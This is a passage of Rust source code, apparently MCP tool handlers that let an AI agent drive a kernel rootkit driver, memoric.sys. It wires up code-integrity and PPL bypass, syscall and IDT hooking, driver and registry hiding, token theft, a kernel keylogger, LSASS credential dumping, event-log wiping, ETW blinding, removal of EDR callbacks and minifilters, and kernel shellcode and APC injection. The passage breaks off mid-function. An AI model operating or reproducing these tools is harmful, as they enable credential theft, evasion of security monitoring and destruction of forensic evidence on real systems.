    let handler = parse_u64_arg(args.get("handler_address")).unwrap_or(0);

    let r = drv
        .infinity_hook(action_code, syscall_number, handler)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_infinity_hook",
        "action": ih_action,
        "enabled": r.enabled != 0,
        "syscall_number": r.syscall_number,
        "interception_count": r.interception_count,
        "get_cpu_clock_addr": format!("0x{:016X}", r.get_cpu_clock_addr),
        "original_handler": format!("0x{:016X}", r.original_handler),
        "message": format!("InfinityHook {}: enabled={}, syscall={}, intercepts={}",
            ih_action, r.enabled != 0, r.syscall_number, r.interception_count)
    }))
}

fn driver_ci_callback_patch(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("ci_action")
        .and_then(|v| v.as_str())
        .unwrap_or("patch");
    let action_code = match action {
        "patch" => CI_CALLBACK_PATCH,
        "restore" => CI_CALLBACK_RESTORE,
        "query" => CI_CALLBACK_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_ci_callback_patch",
                "ci_action",
                action,
                "patch, restore, query",
            ))
        }
    };

    let r = drv
        .ci_callback_patch(action_code)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "se_ci_callbacks_swap",
        "action": action,
        "patched": r.patched == 1,
        "se_ci_callbacks_addr": format!("0x{:016X}", r.se_ci_callbacks_addr),
        "original_ptr": format!("0x{:016X}", r.original_ptr),
        "current_ptr": format!("0x{:016X}", r.current_ptr),
        "zw_flush_addr": format!("0x{:016X}", r.zw_flush_addr),
    }))
}

fn driver_ci_func_patch(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("ci_action")
        .and_then(|v| v.as_str())
        .unwrap_or("patch");
    let action_code = match action {
        "patch" => CI_FUNC_PATCH,
        "restore" => CI_FUNC_RESTORE,
        "query" => CI_FUNC_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_ci_func_patch",
                "ci_action",
                action,
                "patch, restore, query",
            ))
        }
    };

    let r = drv.ci_func_patch(action_code).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "ci_validate_image_header_patch",
        "action": action,
        "patched": r.patched == 1,
        "ci_validate_addr": format!("0x{:016X}", r.ci_validate_addr),
        "original_bytes": format!("{:02X?}", &r.original_bytes[..4]),
        "current_bytes": format!("{:02X?}", &r.current_bytes[..4]),
    }))
}

fn driver_pte_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("pte_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => PTE_READ,
        "write" => PTE_WRITE,
        "make_writable" => PTE_MAKE_WRITABLE,
        "restore" => PTE_RESTORE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_pte_rw",
                "pte_action",
                action,
                "read, write, make_writable, restore",
            ))
        }
    };

    let va = require_u64_param(args, "address", "kernel", "driver_pte_rw")?;
    let new_pte = parse_u64_arg(args.get("new_pte")).unwrap_or(0);

    let r = drv
        .pte_rw(action_code, va, new_pte)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "pte_manipulation",
        "action": action,
        "virtual_address": format!("0x{:016X}", r.virtual_address),
        "pte_address": format!("0x{:016X}", r.pte_address),
        "pte_value": format!("0x{:016X}", r.pte_value),
        "original_pte_value": format!("0x{:016X}", r.original_pte_value),
        "pte_base": format!("0x{:016X}", r.pte_base),
        "writable": (r.pte_value & 2) != 0,
        "present": (r.pte_value & 1) != 0,
    }))
}

fn driver_msr_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("msr_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => MSR_READ,
        "write" => MSR_WRITE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_msr_rw",
                "msr_action",
                action,
                "read, write",
            ))
        }
    };
    let msr_index = args.get("msr_index").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let msr_value = parse_u64_arg(args.get("msr_value")).unwrap_or(0);

    let r = drv
        .msr_rw(action_code, msr_index, msr_value)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "msr_manipulation",
        "action": action,
        "msr_index": format!("0x{:X}", r.msr_index),
        "value": format!("0x{:016X}", r.value),
        "old_value": format!("0x{:016X}", r.old_value),
        "common_msrs": {
            "IA32_LSTAR": "0xC0000082 (syscall entry)",
            "IA32_EFER": "0xC0000080 (extended features)",
            "IA32_DEBUGCTL": "0x1D9 (debug control)",
            "IA32_SYSENTER_EIP": "0x176 (legacy syscall)"
        }
    }))
}

fn driver_cloak(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("cloak_action")
        .and_then(|v| v.as_str())
        .unwrap_or("self");
    let action_code = match action {
        "self" => CLOAK_SELF,
        "target" => CLOAK_TARGET,
        "query" => CLOAK_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_cloak",
                "cloak_action",
                action,
                "self, target, query",
            ))
        }
    };
    let driver_name = args.get("driver_name").and_then(|v| v.as_str());

    let r = drv
        .driver_cloak(action_code, driver_name)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "dkom_driver_unlink",
        "action": action,
        "cloaked": r.cloaked == 1,
        "driver_object": format!("0x{:016X}", r.driver_object_addr),
        "driver_section": format!("0x{:016X}", r.driver_section_addr),
        "entries_removed": r.entries_removed,
    }))
}

fn driver_force_kill(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let method = args
        .get("kill_method")
        .and_then(|v| v.as_str())
        .unwrap_or("terminate");
    let action_code = match method {
        "terminate" => KILL_TERMINATE,
        "dkom" => KILL_DKOM,
        "thread_kill" => KILL_THREAD_KILL,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_force_kill",
                "kill_method",
                method,
                "terminate, dkom, thread_kill",
            ))
        }
    };
    let pid = require_u64_param(args, "pid", "kernel", "driver_force_kill")? as u32;
    let exit_code = args.get("exit_code").and_then(|v| v.as_u64()).unwrap_or(1) as u32;

    let r = drv
        .force_kill(action_code, pid, exit_code)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_force_kill",
        "method": method,
        "process_id": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "description": match method {
            "terminate" => "ZwTerminateProcess from kernel mode — bypasses PPL",
            "dkom" => "DKOM unlink from ActiveProcessLinks — process vanishes",
            "thread_kill" => "Suspend + terminate — reliable for stubborn processes",
            _ => "unknown"
        }
    }))
}

fn driver_force_delete(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let file_path = require_str_param(
        args,
        "file_path",
        "kernel",
        "driver_force_delete",
        Some("Use NT path format like \\??\\C:\\path\\to\\file."),
    )?;

    let r = drv.force_delete(file_path).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_file_delete",
        "file_path": file_path,
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

fn driver_system_thread(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("thread_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "create" => THREAD_CREATE,
        "query" => THREAD_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_system_thread",
                "thread_action",
                action,
                "create, query",
            ))
        }
    };
    let start_address = parse_u64_arg(args.get("thread_start")).unwrap_or(0);
    let context = parse_u64_arg(args.get("thread_context")).unwrap_or(0);

    let r = drv
        .system_thread(action_code, start_address, context)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_system_thread",
        "action": action,
        "thread_handle": format!("0x{:016X}", r.thread_handle),
        "thread_id": r.thread_id,
    }))
}

fn driver_kernel_exec(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("exec_action")
        .and_then(|v| v.as_str())
        .unwrap_or("run");
    let action_code = match action {
        "run" => EXEC_RUN,
        "alloc" => EXEC_ALLOC,
        "free" => EXEC_FREE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_kernel_exec",
                "exec_action",
                action,
                "run, alloc, free",
            ))
        }
    };
    let shellcode: Vec<u8> = args
        .get("shellcode_bytes")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_u64().map(|n| n as u8))
                .collect()
        })
        .unwrap_or_default();
    let alloc_addr = parse_u64_arg(args.get("alloc_address")).unwrap_or(0);

    let r = drv
        .kernel_exec(action_code, &shellcode, alloc_addr)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_shellcode_exec",
        "action": action,
        "allocated_address": format!("0x{:016X}", r.allocated_address),
        "return_value": format!("0x{:016X}", r.return_value),
    }))
}

// === Phase 12 remaining MCP tools ===

fn driver_ppl_bypass(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("ppl_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "strip" => PPL_STRIP,
        "set" => PPL_SET,
        "query" => PPL_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_ppl_bypass",
                "ppl_action",
                action,
                "strip, set, query",
            ))
        }
    };
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let level = args
        .get("protection_level")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u8;
    let r = drv
        .ppl_bypass(action_code, pid, level)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "ppl_bypass",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_protection": format!("0x{:02X}", r.old_protection),
        "new_protection": format!("0x{:02X}", r.new_protection),
    }))
}

fn driver_cr_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("cr_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "write" => CR_WRITE,
        _ => CR_READ,
    };
    let cr_index = args.get("cr_index").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let value = parse_u64_arg(args.get("value")).unwrap_or(0);
    let r = drv
        .cr_rw(action_code, cr_index, value)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "control_register_rw",
        "action": action,
        "cr_index": r.cr_index,
        "value": format!("0x{:016X}", r.value),
        "old_value": format!("0x{:016X}", r.old_value),
    }))
}

fn driver_idt_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("idt_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "write" => IDT_WRITE,
        "dump" => IDT_DUMP,
        _ => IDT_READ,
    };
    let vector = args.get("vector").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let new_handler = parse_u64_arg(args.get("new_handler")).unwrap_or(0);
    let new_dpl = args.get("new_dpl").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
    let r = drv
        .idt_rw(action_code, vector, new_handler, new_dpl)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "idt_manipulation",
        "action": action,
        "vector": r.vector,
        "handler": format!("0x{:016X}", r.handler_address),
        "old_handler": format!("0x{:016X}", r.old_handler_address),
        "segment": format!("0x{:04X}", r.segment),
        "dpl": r.dpl,
        "gate_type": r.gate_type,
        "present": r.present,
        "idt_base": format!("0x{:016X}", r.idt_base),
        "idt_limit": r.idt_limit,
    }))
}

fn driver_unloaded_drv_clear(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("unloaded_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "clear_all" => UNLOADED_CLEAR_ALL,
        "clear_name" => UNLOADED_CLEAR_NAME,
        _ => UNLOADED_QUERY,
    };
    let driver_name = args.get("driver_name").and_then(|v| v.as_str());
    let r = drv
        .unloaded_drv_clear(action_code, driver_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "unloaded_drivers_clear",
        "action": action,
        "entries_cleared": r.entries_cleared,
        "total_entries": r.total_entries,
        "mm_unloaded_drivers": format!("0x{:016X}", r.mm_unloaded_drivers_addr),
    }))
}

fn driver_token_swap(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("swap_action")
        .and_then(|v| v.as_str())
        .unwrap_or("steal");
    let action_code = match action {
        "swap" => TOKEN_SWAP_SWAP,
        "query" => TOKEN_SWAP_QUERY,
        _ => TOKEN_SWAP_STEAL,
    };
    let target_pid = args.get("target_pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let source_pid = args.get("source_pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let r = drv
        .token_swap(action_code, target_pid, source_pid)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "token_swap",
        "action": action,
        "target_pid": r.target_pid,
        "old_token": format!("0x{:016X}", r.old_token),
        "new_token": format!("0x{:016X}", r.new_token),
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
    }))
}

fn driver_process_protect(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("protect_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "set" => PROTECT_SET,
        "strip" => PROTECT_STRIP,
        _ => PROTECT_QUERY,
    };
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let signer_type = args
        .get("signer_type")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u8;
    let signer_audit = args
        .get("signer_audit")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u8;
    let signer_level = args
        .get("signer_level")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u8;
    let r = drv
        .process_protect(action_code, pid, signer_type, signer_audit, signer_level)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "process_protect",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_protection": format!("0x{:02X}", r.old_protection),
        "new_protection": format!("0x{:02X}", r.new_protection),
        "old_signer_type": r.old_signer_type,
        "old_signer_audit": r.old_signer_audit,
    }))
}

// === Phase 13 MCP tools ===

fn driver_keylogger(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("keylog_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "start" => KEYLOG_START,
        "stop" => KEYLOG_STOP,
        "read" => KEYLOG_READ,
        _ => KEYLOG_QUERY,
    };
    let max_keys = args.get("max_keys").and_then(|v| v.as_u64()).unwrap_or(512) as u32;
    let r = drv
        .keylogger(action_code, max_keys)
        .map_err(|e| e.to_string())?;
    let keys: Vec<String> = r.keys[..r.key_count as usize]
        .iter()
        .map(|&k| format!("0x{:04X}", k))
        .collect();
    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_keylogger",
        "action": action,
        "active": r.active == 1,
        "key_count": r.key_count,
        "keys": keys,
    }))
}

fn driver_reg_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("reg_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action_code = match action {
        "add" => REG_HIDE_ADD,
        "remove" => REG_HIDE_REMOVE,
        "clear" => REG_HIDE_CLEAR,
        _ => REG_HIDE_LIST,
    };
    let hide_type = args.get("hide_type").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let key_path = args.get("key_path").and_then(|v| v.as_str()).unwrap_or("");
    let value_name = args.get("value_name").and_then(|v| v.as_str());
    let r = drv
        .reg_hide(action_code, hide_type, key_path, value_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "registry_hiding",
        "action": action,
        "hidden_count": r.hidden_count,
        "total_hidden": r.total_hidden,
    }))
}

fn driver_file_lock(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("lock_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action_code = match action {
        "add" => FILE_LOCK_ADD,
        "remove" => FILE_LOCK_REMOVE,
        "clear" => FILE_LOCK_CLEAR,
        _ => FILE_LOCK_LIST,
    };
    let protect_flags = args
        .get("protect_flags")
        .and_then(|v| v.as_u64())
        .unwrap_or(7) as u32;
    let path = args.get("file_path").and_then(|v| v.as_str()).unwrap_or("");
    let allowed_pid = args
        .get("allowed_pid")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;
    let r = drv
        .file_lock(action_code, protect_flags, path, allowed_pid)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "file_protection",
        "action": action,
        "locked_count": r.locked_count,
        "total_locked": r.total_locked,
    }))
}

fn driver_etw_blind(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("etw_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "disable" => ETW_BLIND_DISABLE,
        "enable" => ETW_BLIND_ENABLE,
        "kill_all" => ETW_BLIND_KILL_ALL,
        _ => ETW_BLIND_QUERY,
    };
    let guid_str = args
        .get("provider_guid")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let mut guid_bytes = [0u8; 16];
    // Parse GUID string like "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
    let hex: String = guid_str.replace('-', "");
    if hex.len() == 32 {
        for i in 0..16 {
            guid_bytes[i] = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).unwrap_or(0);
        }
    }
    let r = drv
        .etw_blind(action_code, &guid_bytes)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "etw_provider_blinding",
        "action": action,
        "providers_affected": r.providers_affected,
        "provider_addr": format!("0x{:016X}", r.provider_addr),
        "old_enable_info": format!("0x{:016X}", r.old_enable_info),
    }))
}

fn driver_eprocess_spoof(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("spoof_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "image_name" => SPOOF_IMAGE_NAME,
        "command_line" => SPOOF_COMMAND_LINE,
        "pid" => SPOOF_PID,
        _ => SPOOF_QUERY,
    };
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let new_name = args.get("new_image_name").and_then(|v| v.as_str());
    let new_cmd = args.get("new_command_line").and_then(|v| v.as_str());
    let new_ppid = args
        .get("new_parent_pid")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;
    let r = drv
        .eprocess_spoof(action_code, pid, new_name, new_cmd, new_ppid)
        .map_err(|e| e.to_string())?;
    let old_name = String::from_utf8_lossy(&r.old_image_name)
        .trim_end_matches('\0')
        .to_string();
    Ok(json!({
        "success": r.success == 1,
        "technique": "eprocess_spoofing",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_image_name": old_name,
        "old_parent_pid": r.old_parent_pid,
    }))
}

fn driver_event_log_clear(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("log_action")
        .and_then(|v| v.as_str())
        .unwrap_or("clear_all");
    let action_code = match action {
        "clear_security" => EVTLOG_CLEAR_SECURITY,
        "clear_system" => EVTLOG_CLEAR_SYSTEM,
        "clear_sysmon" => EVTLOG_CLEAR_SYSMON,
        "kill_service" => EVTLOG_KILL_SERVICE,
        _ => EVTLOG_CLEAR_ALL,
    };
    let log_name = args.get("log_name").and_then(|v| v.as_str());
    let r = drv
        .event_log_clear(action_code, log_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "event_log_tampering",
        "action": action,
        "threads_killed": r.threads_killed,
        "files_deleted": r.files_deleted,
        "svchost_pid": r.svchost_pid,
    }))
}

fn driver_cred_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("cred_action")
        .and_then(|v| v.as_str())
        .unwrap_or("find_lsass");
    let action_code = match action {
        "read" => CRED_READ_MEMORY,
        "dump" => CRED_DUMP_FULL,
        _ => CRED_FIND_LSASS,
    };
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let address = args.get("address").and_then(|v| v.as_u64()).unwrap_or(0);
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(4096) as u32;
    let output = drv
        .cred_dump(action_code, pid, address, size)
        .map_err(|e| e.to_string())?;
    if output.len() < std::mem::size_of::<CredDumpResponse>() {
        return Err("Incomplete cred dump response".to_string());
    }
    let resp: CredDumpResponse = unsafe { *(output.as_ptr() as *const CredDumpResponse) };
    let data_start = std::mem::size_of::<CredDumpResponse>();
    let data = if output.len() > data_start {
        &output[data_start..]
    } else {
        &[]
    };
    let hex_data: String = data
        .iter()
        .take(256)
        .map(|b| format!("{:02X}", b))
        .collect();
    Ok(json!({
        "success": resp.success == 1,
        "technique": "kernel_credential_dump",
        "action": action,
        "pid": resp.process_id,
        "eprocess": format!("0x{:016X}", resp.eprocess_addr),
        "bytes_read": resp.bytes_read,
        "data_preview": hex_data,
    }))
}

fn driver_driver_impersonate(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("imp_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "swap" => IMPERSONATE_SWAP,
        "restore" => IMPERSONATE_RESTORE,
        _ => IMPERSONATE_QUERY,
    };
    let target = args
        .get("target_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let legit = args
        .get("legit_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let r = drv
        .driver_impersonate(action_code, target, legit)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "driver_impersonation",
        "action": action,
        "bytes_written": r.bytes_written,
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

// ── Phase 14: EDR Annihilation MCP Tools ──

fn driver_callback_nuke(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("cb_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => CBNUKE_ENUM,
        "remove" => CBNUKE_REMOVE,
        "nuke_all" => CBNUKE_NUKE_ALL,
        "restore" => CBNUKE_RESTORE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_callback_nuke",
                "cb_action",
                action,
                "enum, remove, nuke_all, restore",
            ))
        }
    };
    let cb_type = args
        .get("cb_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let cb_type_code = match cb_type {
        "process" => CB_TYPE_PROCESS,
        "thread" => CB_TYPE_THREAD,
        "image" => CB_TYPE_IMAGE,
        "object" => CB_TYPE_OBJECT,
        "registry" => CB_TYPE_REGISTRY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_callback_nuke",
                "cb_type",
                cb_type,
                "process, thread, image, object, registry",
            ))
        }
    };
    let index = args.get("index").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let r = drv
        .callback_nuke(action_code, cb_type_code, index)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_callbacks.min(64) as usize {
        let e = &r.entries[i];
        if e.address == 0 {
            continue;
        }
        let name = String::from_utf8_lossy(&e.module_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "address": format!("0x{:016X}", e.address),
            "module_base": format!("0x{:016X}", e.module_base),
            "module_name": name,
            "type": e.cb_type,
            "active": e.active == 1,
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "callback_nuke",
        "action": action,
        "callback_type": cb_type,
        "total_callbacks": r.total_callbacks,
        "removed_count": r.removed_count,
        "entries": entries_json,
    }))
}

fn driver_minifilter_detach(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("mf_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => MINIFILTER_DETACH_ENUM,
        "detach" => MINIFILTER_DETACH_ONE,
        "nuke" => MINIFILTER_DETACH_NUKE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_minifilter_detach",
                "mf_action",
                action,
                "enum, detach, nuke",
            ))
        }
    };
    let filter_name = args
        .get("filter_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let frame_id = args.get("frame_id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let r = drv
        .minifilter_detach(action_code, filter_name, frame_id)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_filters.min(32) as usize {
        let e = &r.entries[i];
        if e.filter_addr == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&e.filter_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "filter_name": name,
            "frame_id": e.frame_id,
            "num_instances": e.num_instances,
            "filter_addr": format!("0x{:016X}", e.filter_addr),
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "minifilter_detach",
        "action": action,
        "total_filters": r.total_filters,
        "detached_count": r.detached_count,
        "entries": entries_json,
    }))
}

fn driver_kernel_apc(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("apc_action")
        .and_then(|v| v.as_str())
        .unwrap_or("inject");
    let action_code = match action {
        "inject" => KAPC_INJECT,
        "dll" => KAPC_DLL,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_kernel_apc",
                "apc_action",
                action,
                "inject, dll",
            ))
        }
    };
    let pid = require_u64_param(args, "pid", "kernel", "driver_kernel_apc")? as u32;
    let tid = args.get("tid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let sc_size = args
        .get("shellcode_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;
    let sc_addr = parse_u64_arg(args.get("shellcode_addr")).unwrap_or(0);
    let dll_path = args.get("dll_path").and_then(|v| v.as_str()).unwrap_or("");
    let r = drv
        .kernel_apc_inject(action_code, pid, tid, sc_size, sc_addr, dll_path)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_apc_inject",
        "action": action,
        "thread_id": r.thread_id,
        "apc_addr": format!("0x{:016X}", r.apc_addr),
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

fn driver_wfp_remove(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let action = args
        .get("wfp_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => WFP_ENUM,
        "remove" => WFP_REMOVE_ONE,
        "nuke" => WFP_NUKE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_wfp_remove",
                "wfp_action",
                action,
